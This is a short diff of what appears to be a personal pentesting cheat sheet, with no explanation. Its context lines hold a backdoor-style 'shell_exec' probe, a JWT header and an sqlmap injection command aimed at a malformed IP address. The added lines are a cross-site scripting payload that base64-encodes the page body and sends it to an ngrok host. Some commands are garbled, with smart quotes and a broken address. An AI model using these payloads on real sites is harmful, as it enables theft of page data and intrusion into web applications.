@@ -22,5 +22,8 @@ $ grep –r “shell_exec(“ ;;welldone=knocknock&shazam=ls(non-difbackdoor)
 application/json;;Authorization:  JWT(authorization)
 Sqlmap –cookie==”asdfghjk” -u http://3.3.3.:4545/index.php --forms --columns --random-agent(schematics)
 
-
+<script>
+var exfil = document.getElementsByTagName("body")[0].innerHTML;
+window.location.href="https://c3d9707d386e.ngrok.io?pgsrc=" + btoa(exfil);
+</script>
 
